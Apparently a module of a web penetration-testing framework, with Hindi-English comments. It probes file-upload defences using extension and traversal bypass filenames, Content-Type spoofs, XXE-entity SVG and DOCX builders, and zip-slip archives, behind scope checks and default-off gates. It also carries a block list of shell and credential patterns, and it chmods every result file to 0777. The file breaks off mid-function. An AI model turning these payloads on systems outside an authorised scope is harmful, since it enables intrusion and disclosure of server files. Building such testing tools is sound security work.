#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
WASP Module: mod_files.py  |  Phase 16 - File Upload (Unrestricted Upload family)
           (extension/MIME/magic filters, filename-traversal, serve-back analysis,
            SVG/Office import XXE, archive zip-slip, storage hardening audit)
=======================================================================================
v16.0.0 ULTRA ULTRA PRO MAX. Authorized security testing ONLY. Scope firewall +
rate limiter + request budget + evidence + checkpoint sab wasp_core se inherit
hote hain, isliye har request scope-check, rate-limit aur budget ke andar hi
jaati hai.

KYA KARTA HAI
  P15 server ki outbound trust (kahan fetch karta hai) dekh raha tha. P16 INBOUND
  file trust dekhta hai: "MERA server, ATTACKER ke chune hue FILES kahan tak
  accept, process aur serve karta hai?" ->
    * Upload filters  - extension / MIME / magic-byte validation gaps
    * Filename abuse  - traversal, double-extension, unicode, null-byte-legacy
    * Serve-back      - uploaded file KIS Content-Type se wapas milti hai (exec surface)
    * Import parsers  - SVG/DOCX/XML import endpoints par XXE (P15 chain handoff)
    * Archive escape  - zip-slip (RoE-gated), size-limit census
    * Access control  - uploaded files anon-readable? dir listing? (P11 handoff)
  FUNDAMENTAL DISCIPLINE (P12->P15 handoff): blind scanner NAHI. P15 svg_doc_
  endpoints + P5 upload paths + P2 multipart forms + P7 js params + P12 filename
  reflections + P8 priority = seed list. Wahan targeted, evidence-backed probes.

VERDICT LADDER (6-class, P12/P13/P14/P15-compatible)
  CONFIRMED   -> multi-signal proof (risky filename accepted + served exec-CT,
                 import parser entity resolved, filename traversal landed)
  SUSPECTED   -> partial/single signal (accepted but getback blocked, CT spoof)
  HARDENED    -> defense present (whitelist + random-rename + outside-webroot,
                 nosniff + attachment serving) - positive signal
  BLOCKED     -> WAF/probe-level block (fingerprint input, finding nahi)
  SKIPPED     -> RoE-gated probe (gate OFF) - manual wave documented
  NOISE       -> baseline unstable / soft-404 template - verdict nahi

SAFETY MODEL (uploads 'double-edged' hain - P15 jitni strict discipline)
  * 100% INERT CONTENT: har upload body FORBIDDEN_CONTENT_PATTERNS se guzarti
    hai (<?php / eval( / system( / <script / onload= / shebang / ...). Koi
    webshell/code payload KABHI build ya upload nahi hota - sirf canary text +
    image magic bytes. Self-test me hard-asserted.
  * CANARY NAMES: har filename waspP16<rnd> family - server par sirf NAYE files
    banti hain, kisi existing file ko touch/overwrite-target nahi (overwrite
    test bhi apne hi canary name par).
  * .htaccess / .user.ini / web.config / webshell / polyglot-exploit rows
    FORBIDDEN-AUTO ya MANUAL-ONLY - technique matrix me documented, kabhi probe
    nahi hote.
  * ZIP-SLIP: RoE-gated (files_allow_archive default OFF) - INERT zip, canary
    text content, unique entry names (overwrite impossible).
  * IMPORT XXE (svg/docx entities): RoE-gated (files_allow_import_xxe default
    OFF) - P15 ke xxe gates jaisa hi. Plain SVG (no entities) benign hai.
  * CONTENT REDACTION: getback responses ka content kabhi store nahi hota -
    sirf len + sha1-prefix + marker-boolean (filesig). PII/creds double-guard.
  * CLEANUP: uploaded canary files ka best-effort DELETE RoE-gated
    (files_allow_cleanup default OFF) - manual wave documented.
  * ZERO EXTERNAL EGRESS: koi URL target-host/loopback/reserved (.invalid) se
    bahar nahi jaata. Size probes 2KB-capped (no DoS, no zip-bomb - FORBIDDEN).
  * allow_active=False -> PASSIVE mode: seed census + offline hypotheses only.
  * Har stage checkpointed (Ctrl+C safe), sab caps config se tunable.
  * Sab result files RWX (0777) - RWX standing rule wrappers se guaranteed.
  * POST uploads force_write=True par jaate hain (framework write-gate) - sirf
    INERT canary bodies ke saath, yahi is phase ka core probe hai.
"""

import os
import re
import io
import sys
import json
import time
import copy
import base64
import zipfile
import hashlib
import struct
import zlib
import urllib.parse
import concurrent.futures

# --- WASP v2.2 standalone path fix (auto-inserted) ---
_wasp22_dir = os.path.dirname(os.path.abspath(__file__))
if _wasp22_dir not in sys.path:
    sys.path.insert(0, _wasp22_dir)
_wasp22_p = _wasp22_dir
while _wasp22_p != os.path.dirname(_wasp22_p):
    _wasp22_p = os.path.dirname(_wasp22_p)
    if os.path.exists(os.path.join(_wasp22_p, "wasp_core.py")):
        if _wasp22_p not in sys.path:
            sys.path.insert(0, _wasp22_p)
        break
# --- end WASP v2.2 fix ---

try:
    from wasp_core import (Cfg, Scope, ScopeError, Evidence, HttpClient, Checkpoint,
                           outdir_for, now_iso, save_json, save_text, load_json,
                           rand_str, shannon_entropy, host_of, median, mad,
                           robust_z, truncate, similarity, module_ctx,
                           write_feedforward, write_manifest, soft404_baseline,
                           is_soft404, title_of, waf_signature, dns_resolve,
                           redirect_chain, interrupted, info, ok, warn, err,
                           head, C, VERSION, now_human, human_size)
    CORE = True
except ImportError:
    CORE = False
    print("[-] wasp_core.py isi folder me hona chahiye (wasp_core.py not found).")
    print("    Ye module WASP framework ka hissa hai: python3 wasp.py run --module 16")
    sys.exit(1)

NAME = "files"
PHASE = "16-files"
PLAN_VERSION = "17.0.0"

# ===========================================================================
# TUNABLES (config.json attributes override kar sakte hain)
# ===========================================================================
DEFAULTS = {
    "files_upload_endpoints": 10,     # active upload-probe endpoint cap
    "files_ext_variants": 24,         # filename/extension bypass matrix cap (v17: pool 51)
    "files_ct_variants": 10,          # content-type spoof matrix cap (v17: pool 20)
    "files_filename_tricks": 10,      # filename traversal/unicode tricks cap (v17: pool 18)
    "files_param_candidates": ("file,upload,image,attachment,document,"
                               "fileToUpload,avatar,photo,img,media,importfile,"
                               "userfile,data,files[],file_data,uploadfile"),
    "files_getback": True,            # uploaded file GET-back serve analysis
    "files_svg_import": True,         # plain SVG + import endpoint census
    "files_allow_import_xxe": False,  # RoE GATE: svg/docx ENTITY payloads
    "files_allow_archive": False,     # RoE GATE: zip-slip archive probes
    "files_allow_cleanup": False,     # RoE GATE: best-effort DELETE cleanup
    "files_cold_start": 12,           # cold-start upload-form harvest GET cap
    "files_max_bytes": 2048,          # upload body size cap (no DoS)
    "files_same_name_probe": True,    # overwrite-behaviour canary check
    "files_list_dirs": 6,             # upload-dir listing check cap
    # ---- v17 ULTRA additions (deep-dive + bypass families + RoE gates) ----
    "files_deep_endpoints": 3,        # deep-dive winner endpoint cap
    "files_ext_matrix": True,         # ext acceptance model (bl/wl/gaps)
    "files_ext_matrix_cap": 34,       # ext acceptance probe cap
    "files_multipart_confusion": True,  # parser-confusion engine
    "files_confusion_cap": 14,        # confusion variant cap (pool 15)
    "files_magic_consistency": True,  # magic/ext/CT cross-mismatch probes
    "files_client_bypass": True,      # MAX_FILE_SIZE + accept= enforcement diff
    "files_exotic_census": True,      # xlsx/odt/jar/gz/ico/webp/mp4 census
    "files_metadata": True,           # PNG tEXt/JPEG COM survival + re-encode
    "files_storage_fp": True,         # backend fingerprint + rename policy
    "files_allow_svg_ssrf": False,    # RoE GATE: SVG <image> same-origin diff
    "files_allow_put_method": False,  # RoE GATE: PUT/DAV write probe
    "files_allow_race": False,        # RoE GATE: concurrent same-name (<=4)
    "files_race_threads": 4,          # race probe concurrency hard-cap
}

# ===========================================================================
# RWX STANDING RULE (user memory): pentest ke SAARE result/output files ko
# read+write+execute (0777 rwxrwxrwx) permission milni chahiye.
# ===========================================================================
def _rwx_result(path):
    try:
        os.chmod(path, 0o777)
    except OSError:
        pass
    return path


def _rwx_save_json(path, obj):
    d = os.path.dirname(path)
    if d:
        _rwx_dir(d)
    with open(path, "w") as f:
        json.dump(obj, f, indent=2, default=str)
    return _rwx_result(path)


def _rwx_save_text(path, text):
    d = os.path.dirname(path)
    if d:
        _rwx_dir(d)
    with open(path, "w") as f:
        f.write(text if isinstance(text, str) else str(text))
    return _rwx_result(path)


def _rwx_dir(path):
    try:
        os.makedirs(path, exist_ok=True)
        os.chmod(path, 0o777)
    except OSError:
        pass
    return path


# ===========================================================================
# SEVERITY CLASSIFICATION (P12/P13/P14/P15 pattern - key -> sev/cvss/why)
# ===========================================================================
SEVERITY_HINTS = {
    # ---- upload core ----
    "upload_exec_content_type":  ("critical", 9.5, "Uploaded file executable/"
        "HTML Content-Type se serve ho rahi hai (text/html|php-class) - "
        "webshell-ready storage surface (content INERT tha; attacker wahi "
        "jagah code rakh sakta hai). Chain -> server takeover."),
    "upload_risky_ext_accepted": ("critical", 9.2, "Server-side executable "
        "extension (.php/.jsp/.aspx-class) INERT content par bhi ACCEPT hui - "
        "whitelist missing; sirf storage+serve config RCE se rok rahi hai."),
    "upload_filename_traversal": ("critical", 9.0, "Filename me ../ server ne "
        "accept kiya - upload path attacker-controlled (webroot escape / "
        "arbitrary-file-create -> config overwrite tak chain)."),
    "upload_import_xxe":         ("critical", 9.1, "Import/parser endpoint ne "
        "uploaded XML/SVG/DOCX ke external entities process kiye - file-read "
        "chain (P15 handoff, content redacted)."),
    "upload_no_validation":      ("high", 8.5, "Koi server-side validation "
        "nahi - sab extensions/content-types accept hue (client-side accept= "
        "attribute ke bharose). Classic CWE-434."),
    "upload_svg_served_inline":  ("high", 7.8, "SVG image/svg+xml inline serve "
        "hoti hai (nosniff absent) - stored-XSS surface (script kabhi upload "
        "nahi kiya; P13 chain handoff)."),
    "upload_xss_content_type":   ("high", 8.0, "Upload text/HTML Content-Type "
        "se serve hoti hai - attacker-controlled HTML origin ban jaata hai "
        "(same-origin scripts only manual wave)."),
    "upload_unauth_accessible":  ("high", 7.6, "Uploaded file bina auth fetch "
        "ho gayi (anonymous GET-back) - user-data/avatar leaks (P11 chain)."),
    "upload_double_ext":         ("high", 7.5, "Double-extension file accepted "
        "+ raw serve (x.png.php family) - extension-check sirf ends-with hai."),
    "upload_extension_blacklist": ("medium", 6.2, "Blacklist-style filtering "
        "(specific ext reject, baaki sab accept) - bypass-prone design "
        "(case/double-ext/legacy-ext variants isliye pass hue)."),
    "upload_mime_bypass":        ("medium", 6.5, "Content-Type spoof accepted - "
        "server CT par trust karta hai (MIME-sniffing/extension-check absent)."),
    "upload_magic_missing":      ("medium", 5.8, "Magic-byte check absent - "
        "GIF89a text-polyglot (INERT) image-name se accepted."),
    "upload_client_only_filter": ("medium", 6.3, "Validation sirf client-side "
        "accept= attribute me - server side sab accept karta hai."),
    "upload_filename_unicode":   ("medium", 5.9, "Unicode/fullwidth filename "
        "accepted - filesystem-normalization gap family (detection primitives)."),
    "upload_nullbyte_legacy":    ("medium", 5.5, "Null-byte filename accepted "
        "(legacy runtime signal) - truncation-bypass family (modern PHP "
        "immune; hypothesis-only)."),
    "upload_dir_listing":        ("medium", 6.1, "Upload directory listing "
        "enabled - sab users' files enumerable (privacy + targeting aid)."),
    "upload_overwrite_possible": ("medium", 6.0, "Same-name upload overwrite "
        "hoti hai - attacker-chosen names par file-hijack/deface surface."),
    "upload_size_unlimited":     ("low", 3.5, "Koi size-limit signal nahi "
        "(413 kabhi nahi mila bounded probes me) - DoS surface hypothesis."),
    "upload_path_disclosure":    ("low", 4.5, "Upload response me server path/"
        "URL structure leak - targeting aid (low impact alone)."),
    "upload_mime_whitelist_ok":  ("info", 0.0, "CT whitelist present (positive)."),
    "upload_served_attachment":  ("info", 0.0, "Serving Content-Disposition: "
        "attachment + nosniff - safe serving (positive signal)."),
    "upload_hardened":           ("info", 0.0, "Random-rename/whitelist/"
        "outside-webroot hardening detect hui (positive signal)."),
    "upload_gate_skipped":       ("info", 0.0, "RoE-gated probes OFF the - "
        "INERT payloads upload_payloads/ me ready hain (manual wave)."),
    "upload_surface_sparse":     ("info", 0.0, "Seed artifacts kam mile - "
        "P2/P5/P7/P15 pehle chalao (upload/import features wahan se aate "
        "hain)."),
    # ---- MANUAL-ONLY (kabhi auto nahi) ----
    "upload_webshell_manual":    ("info", 0.0, "Webshell upload chain "
        "hypothesis - FORBIDDEN-AUTO: framework INERT rehta hai; RoE+lab me "
        "MANUAL verify karo."),
    "upload_htaccess_manual":    ("info", 0.0, ".htaccess/.user.ini/web.config "
        "upload bypass - FORBIDDEN-AUTO: server-config mutation; MANUAL wave "
        "sirf apne lab me."),
    "upload_race_manual":        ("info", 0.0, "Race-condition upload (check-"
        "then-use TOCTOU) - concurrent MANUAL wave, auto kabhi nahi."),
    "upload_polyglot_manual":    ("info", 0.0, "JPEG/PHP-GD/EXIF polyglot "
        "chains - MANUAL-ONLY (re-coding pipelines ke saath verify hoti "
        "hain)."),
    "upload_imagetragick_manual": ("info", 0.0, "ImageTragick/MVG delegate "
        "family - MANUAL-ONLY (processor version fingerprint ke saath)."),
    "upload_ffmpeg_manual":      ("info", 0.0, "FFmpeg HLS-playlist SSRF/file-"
        "read - MANUAL-ONLY (P15 chain ka media variant)."),
    "upload_phar_manual":        ("info", 0.0, "phar:// deserialization chain - "
        "MANUAL-ONLY (PHP app fingerprint chahiye)."),
}
SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def classify_severity(key):
    sev, cvss, why = SEVERITY_HINTS.get(key, ("info", 0.0, "Upload-surface signal."))
    return sev, cvss, why


# ---------------------------------------------------------------------------
# PII + FILE-CONTENT REDACT (framework rule)
# ---------------------------------------------------------------------------
_PII_JWT = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}")
_PII_EMAIL = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
_PII_PHONE = re.compile(r"\+?\d[\d\s().-]{7,}\d")
_PII_CREDS = re.compile(
    r"(?i)((AKIA|ASIA)[0-9A-Z]{16}|BEGIN [A-Z ]*PRIVATE KEY|"
    r"(aws_secret_access_key|secret_access_key|api_key|apikey|passwd|password|"
    r"secret|token)\s*[:=]\s*[^\s,;\"]{6,})")


def pii_redact(s, limit=420):
    """PII + creds patterns -> masked (uploaded-content echo kabhi plain nahi)."""
    s = _PII_JWT.sub("eyJ***REDACTED***", s or "")
    s = _PII_EMAIL.sub(lambda m: m.group(0)[:2] + "***@***", s)
    s = _PII_PHONE.sub("***PHONE***", s)
    s = _PII_CREDS.sub(lambda m: (m.group(0)[:6] + "***REDACTED***"), s)
    return truncate(s, limit)


class Findings:
    def __init__(self):
        self.items = []

    def add(self, key, title, endpoint, detail, evidence_ref="", extra=None):
        sev, cvss, why = classify_severity(key)
        rec = {"id": "FIL-%03d" % (len(self.items) + 1), "key": key, "title": title,
               "severity": sev, "cvss_hint": cvss, "endpoint": endpoint,
               "detail": pii_redact(detail), "why_it_matters": why,
               "evidence": evidence_ref, "ts": now_iso()}
        if extra:
            rec.update(extra)
        self.items.append(rec)
        return rec


def _sev_counts(F):
    counts = {}
    for f in F.items:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    return counts


# ---------------------------------------------------------------------------
# CANARY SYSTEM (P12..P15 pattern): family "waspP16" - grep-able markers.
# ---------------------------------------------------------------------------
def _canary(tag="c"):
    return "waspP16%s%s" % (tag, rand_str(8).upper())


REDACTED_PLACEHOLDER = "[WASP P16 REDACTED - getback content stored nahi hota " \
                       "(detection-only); sirf len/sha1/marker-boolean save]"


def filesig(body):
    """Serve-back content ka REDACTED signature: len + sha1-prefix + flag."""
    b = body if isinstance(body, bytes) else (body or "").encode("utf-8", "ignore")
    return {"len": len(b), "sha1_12": hashlib.sha1(b).hexdigest()[:12],
            "content_stored": False}


# ===========================================================================
# INERT PAYLOAD SAFETY (CROWN DISCIPLINE)
# ===========================================================================
# FORBIDDEN_CONTENT_PATTERNS: inme se KOI bhi pattern kisi upload body me nahi
# ho sakta. Payload builder + probe engine dono par enforce, self-test me
# hard-asserted. Isi liye P16 ka auto-probe webshell-ban-me-fail NAHI ho sakta.
FORBIDDEN_CONTENT_PATTERNS = [
    r"<\?php", r"<\?=", r"<%@", r"<\%",
    r"eval\s*\(", r"(?i)system\s*\(", r"(?i)exec\s*\(", r"(?i)passthru\s*\(",
    r"(?i)shell_exec\s*\(", r"(?i)proc_open\s*\(", r"(?i)popen\s*\(",
    r"(?i)base64_decode", r"(?i)preg_replace\s*\(.*/e",
    r"<script", r"(?i)on(load|error|click|mouseover|focus)\s*=",
    r"(?i)javascript:", r"#!/bin/", r"#!/usr/",
    r"(?i)java\.lang\.Runtime", r"(?i)ProcessBuilder", r"(?i)cmd\.exe",
    r"(?i)Invoke-Expression", r"(?i)powershell", r"(?i)/etc/shadow",
    r"(?i)curl\s+http", r"(?i)wget\s+http", r"(?i)import\s+os\b",
]
_FORBIDDEN_RX = [re.compile(p) for p in FORBIDDEN_CONTENT_PATTERNS]


def assert_inert(body, what="payload"):
    """Upload body INERT hai? (True = safe). FORBIDDEN pattern -> raise."""
    b = body if isinstance(body, bytes) else str(body).encode("utf-8", "ignore")
    low = b.decode("utf-8", "ignore").lower()
    for i, rx in enumerate(_FORBIDDEN_RX):
        m = rx.search(low)
        if m:
            raise ValueError("NON-INERT %s blocked (pattern %d: %s)"
                             % (what, i, FORBIDDEN_CONTENT_PATTERNS[i]))
    return True


# ===========================================================================
# PAYLOAD LIBRARY 1: MAGIC-BYTE BUILDERS (sab INERT - sirf headers + canary)
# ===========================================================================
def magic_png(canary):
    """Minimal PNG header + canary chunk (1x1 IHDR shape, no IDAT needed)."""
    return (b"\x89PNG\r\n\x1a\n"
            b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00"
            b"\x00\x00\x1f\x15\xc4\x89" +
            canary.encode("utf-8", "ignore")[:120])


def magic_gif(canary):
    return b"GIF89a" + canary.encode("utf-8", "ignore")[:160]


def magic_jpg(canary):
    return (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" +
            canary.encode("utf-8", "ignore")[:120])


def magic_pdf(canary):
    return (b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
            b"%% canary comment\n" + canary.encode("utf-8", "ignore")[:120])


def plain_text(canary):
    return ("%s\n%s\n" % (canary, "detection-only inert probe - no executable "
                          "content")).encode("utf-8", "ignore")


# ===========================================================================
# PAYLOAD LIBRARY 2: EXTENSION / FILENAME BYPASS VARIANTS
# ===========================================================================
# Dangerous-ext auto-set. NOTE: .htaccess/.user.ini/web.config/crossdomain
# INTENTIONALLY absent - wo FORBIDDEN-AUTO hain (manual wave rows).
DANGEROUS_EXTS = ["php", "php5", "phtml", "phar", "jsp", "jspx", "asp",
                  "aspx", "ashx", "shtml", "cgi", "pl", "war", "html"]
MANUAL_ONLY_EXTS = ["htaccess", "user.ini", "web.config", "crossdomain.xml"]


def filename_variants(canary, cap=40):
    """(label, filename) bypass matrix - sab INERT png content ke saath
    upload hoti hain. Sirf FILENAME change hota hai -> filter-gap detection.
    v17: 51-variant pool (originals-first, phir extended families)."""
    b = canary.lower()
    v = [
        ("benign-png",        "%s.png" % b),
        ("plain-dangerous",   "%s.php" % b),
        ("double-ext",        "%s.png.php" % b),
        ("reverse-double",    "%s.php.png" % b),
        ("case-trick",        "%s.PHP" % b),
        ("mixed-case",        "%s.pHp" % b),
        ("trailing-dot",      "%s.php." % b),
        ("trailing-space",    "%s.php " % b),
        ("trailing-dot-space", "%s.php. " % b),
        ("semicolon-win",     "%s.php;.png" % b),
        ("nullbyte-legacy",   "%s.php\x00.png" % b),
        ("phtml",             "%s.phtml" % b),
        ("shtml",             "%s.shtml" % b),
        ("svg-serve",         "%s.svg" % b),
        ("jsp",               "%s.jsp" % b),
        ("dot-prefix",        "./%s.php" % b),
        ("fullwidth-dot",     "%s\xff0e.php" % b),
        ("triple-ext",        "%s.php.png.jpg" % b),
        ("double-php",        "%s.php.php" % b),
        ("alt-caps-ext",      "%s.PNG" % b),
        ("trailing-tab",      "%s.php\t" % b),
        ("trailing-newline",  "%s.php\n" % b),
        ("leading-dot",       ".%s.php" % b),
        ("semicolon-iis",     "%s.asp;.jpg" % b),
        ("nullbyte-trailing", "%s.php\x00" % b),
        ("nullbyte-enc",      "%s.php%%00.png" % b),
        ("nullbyte-slash",    "%s.php\x00/.png" % b),
        ("pht",               "%s.pht" % b),
        ("phar",              "%s.phar" % b),
        ("pgif",              "%s.pgif" % b),
        ("php5",              "%s.php5" % b),
        ("php7",              "%s.php7" % b),
        ("jspx",              "%s.jspx" % b),
        ("asp",               "%s.asp" % b),
        ("aspx",              "%s.aspx" % b),
        ("cer-iis",           "%s.cer" % b),
        ("asa-iis",           "%s.asa" % b),
        ("ashx",              "%s.ashx" % b),
        ("cfm",               "%s.cfm" % b),
        ("cgi",               "%s.cgi" % b),
        ("war",               "%s.war" % b),
        ("svgz-serve",        "%s.svgz" % b),
        ("exe",               "%s.exe" % b),
        ("fullwidth-php",     "%s.\uff50\uff48\uff50" % b),
        ("unicode-comb",      "%s.php\u0301.png" % b),
        ("rtlo-spoof",        "%s\u202egpj.png" % b),
        ("ads-win",           "%s.png::$DATA" % b),
        ("ads-win-exec",      "%s.php::$DATA" % b),
        ("backslash-rel",     "..\\%s.php" % b),
        ("encoded-dot",       "%s%%2ephp" % b),
        ("double-enc-null",   "%s.php%%2500.png" % b),
    ]
    return v[:max(1, cap)]


def filename_trick_variants(canary, cap=6):
    """Filename traversal/unicode tricks (traversal family - INERT content).
    v17: 18-trick pool (originals-first, phir extended encodings)."""
    b = canary.lower()
    v = [
        ("relative-up",       "../../%s.png" % b),
        ("relative-up-enc",   "..%%2f..%%2f%s.png" % b),
        ("absolute-tmp",      "/tmp/%s.png" % b),
        ("deep-up",           "a/b/../../../%s.png" % b),
        ("unicode-dotdot",    "\uff0e\u002e/%s.png" % b),
        ("windows-up",        "..\\..\\%s.png" % b),
        ("relative-half",     "..%%2f%s.png" % b),
        ("absolute-www",      "/var/www/html/%s.png" % b),
        ("absolute-win",      "C:\\windows\\temp\\%s.png" % b),
        ("unc-loopback",      "\\\\127.0.0.1\\share\\%s.png" % b),
        ("dot-stack",         "....//....//%s.png" % b),
        ("windows-enc",       "..%%5c..%%5c%s.png" % b),
        ("tomcat-semicolon",  "..;/%s.png" % b),
        ("overlong-utf8",     "..%%c0%%af%s.png" % b),
        ("overlong-utf8-2",   "..%%c1%%9c%s.png" % b),
        ("double-enc",        "..%%252f%s.png" % b),
        ("null-slash",        "../%%00%s.png" % b),
        ("mixed-slash",       "..\\/%s.png" % b),
    ]
    return v[:max(1, cap)]


def ct_variants(cap=6):
    """Content-Type spoof matrix (same INERT png bytes har CT ke saath)."""
    v = [
        ("image/png", "honest"),
        ("image/jpeg", "spoof"),
        ("image/gif", "spoof"),
        ("text/plain", "spoof"),
        ("application/octet-stream", "spoof"),
        ("image/svg+xml", "spoof"),
        ("application/x-php", "dangerous-honest"),
        ("image/bmp", "spoof"),
        ("image/webp", "spoof"),
        ("image/jpg", "spoof-nonstandard"),
        ("application/pdf", "spoof"),
        ("application/zip", "spoof"),
        ("text/html", "spoof-dangerous"),
        ("application/x-httpd-php", "dangerous-honest"),
        ("audio/mpeg", "cross"),
        ("video/mp4", "cross"),
        ("application/binary", "spoof"),
        ("binary/octet-stream", "spoof-nonstandard"),
        ("image/png; charset=utf-8", "param-trick"),
        ("", "empty-ct"),
    ]
    return v[:max(1, cap)]


# ===========================================================================
# PAYLOAD LIBRARY 3: SVG / DOCX / ZIP INERT BUILDERS (P15 handoff reuse)
# ===========================================================================
def svg_plain(canary):
    """BENIGN SVG - koi entity, koi script. Serve-back CT analysis ke liye."""
    return ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
            '<text x="8" y="32">%s</text><!-- inert probe --></svg>'
            % canary).encode("utf-8", "ignore")


def svg_entity(canary, target_file):
    """XXE-detection SVG (file:// entity). RoE-GATED - files_allow_import_xxe.
    INERT: sirf entity declaration; parser resolve kare to error/marker me
    file path ka echo hota hai (content kabhi store nahi hota)."""
    return ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://%s">]>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
            '<text x="8" y="32">&xxe;</text><!-- %s --></svg>'
            % (target_file, canary)).encode("utf-8", "ignore")


def docx_entity_bytes(canary, target_file):
    """Minimal DOCX (zip) jisme document.xml me external entity ho.
    RoE-GATED (files_allow_import_xxe). INERT - content canary text."""
    ct_xml = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
              '<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
              'content-types"><Default Extension="rels" ContentType="application/'
              'vnd.openxmlformats-package.relationships+xml"/><Default Extension='
              '"xml" ContentType="application/xml"/><Override PartName="/word/'
              'document.xml" ContentType="application/vnd.openxmlformats-'
              'officedocument.wordprocessingml.document.main+xml"/></Types>')
    rels = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
            '2006/relationships"><Relationship Id="rId1" Type="http://schemas.'
            'openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/></Relationships>')
    doc = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
           '<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file://%s">]>'
           '<w:document xmlns:w="http://schemas.openxmlformats.org/'
           'wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>'
           '&xxe;<!-- %s --></w:t></w:r></w:p></w:body></w:document>'
           % (target_file, canary))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct_xml)
        z.writestr("_rels/.rels", rels)
        z.writestr("word/document.xml", doc)
    return buf.getvalue()


def zipslip_bytes(canary, entries=2):
    """INERT zip jisme canonical ../ entries ho (zip-slip detection).
    RoE-GATED (files_allow_archive). Content canary text; entry names unique
    canary - overwrite impossible."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("%s_safe.txt" % canary.lower(),
                   "inert canary - normal entry\n%s\n" % canary)
        for i in range(max(1, min(3, entries))):
            nm = "../%s_slip%d.txt" % (canary.lower(), i)
            z.writestr(nm, "inert canary - traversal entry (detection-only)\n"
                           "%s\n" % canary)
    return buf.getvalue()


# ===========================================================================
# PAYLOAD LIBRARY 4 (v17 ULTRA): FORMAT FAMILIES + METADATA + OFFICE + SVG
# Sab INERT - sirf magic headers + canary text (FORBIDDEN_CONTENT enforced)
# ===========================================================================
MIN_GIF_1X1 = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
               b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b")


def magic_gif87a(canary):
    return b"GIF87a" + canary.encode("utf-8", "ignore")[:160]


def magic_zip(canary):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr("%s_canary.txt" % canary.lower(),
                   "inert canary zip\n%s\n" % canary)
    return buf.getvalue()


def magic_bmp(canary):
    hdr = (b"BM" + struct.pack("<IHHI", 62, 0, 0, 54) +
           struct.pack("<IiiHHIIiiII", 40, 1, 1, 1, 24, 0, 8, 0, 0, 0, 0))
    return hdr + canary.encode("utf-8", "ignore")[:32] + b"\x00\x00"


def magic_tiff(canary):
    return b"II*\x00\x08\x00\x00\x00" + canary.encode("utf-8", "ignore")[:120]


def magic_webp(canary):
    chunk = b"VP8 \x04\x00\x00\x00" + canary.encode("utf-8", "ignore")[:64]
    return b"RIFF" + struct.pack("<I", 4 + len(chunk)) + b"WEBP" + chunk


def magic_mp4(canary):
    return (b"\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom" +
            canary.encode("utf-8", "ignore")[:96])


def magic_gzip(canary):
    return (b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03" +
            canary.encode("utf-8", "ignore")[:120])


def magic_rar(canary):
    return b"Rar!\x1a\x07\x01\x00" + canary.encode("utf-8", "ignore")[:120]


def magic_7z(canary):
    return b"7z\xbc\xaf\x27\x1c\x00\x04" + canary.encode("utf-8", "ignore")[:120]


def magic_ico(canary):
    return (b"\x00\x00\x01\x00\x01\x00\x01\x01\x00\x00\x01\x00\x18\x00"
            b"\x30\x00\x00\x00\x16\x00\x00\x00" +
            canary.encode("utf-8", "ignore")[:64])


def png_valid_text(canary):
    """VALID PNG: 1x1 IHDR (real CRC) + tEXt canary chunk + IEND. Image
    processors ise accept karte hain -> re-encode/strip differential."""
    def chunk(typ, data):
        return (struct.pack(">I", len(data)) + typ + data +
                struct.pack(">I", zlib.crc32(typ + data) & 0xffffffff))
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    txt = b"waspP16\x00" + canary.encode("utf-8", "ignore")[:120]
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) +
            chunk(b"tEXt", txt) + chunk(b"IEND", b""))


def png_dims(body):
    """PNG IHDR se (width, height) - transformation detection (INERT math)."""
    if not body or body[:8] != b"\x89PNG\r\n\x1a\n" or len(body) < 24:
        return None
    try:
        w, h = struct.unpack(">II", body[16:24])
        return (w, h)
    except Exception:
        return None


def jpeg_com_segment(canary):
    """JPEG + COM (comment) segment canary - metadata survival probe."""
    can = canary.encode("utf-8", "ignore")[:120]
    app0 = b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    com = b"\xff\xfe" + struct.pack(">H", len(can) + 2) + can
    return b"\xff\xd8" + app0 + com + b"\xff\xd9"


def gif_comment_ext(canary):
    """Valid 1x1 GIF89a + comment extension (0x21 0xFE) canary."""
    can = canary.encode("utf-8", "ignore")[:200]
    com = b"\x21\xfe" + bytes([len(can)]) + can + b"\x00"
    return MIN_GIF_1X1[:-1] + com + b"\x3b"


def xlsx_benign_bytes(canary):
    """Minimal benign XLSX package (zip) - office import census. INERT."""
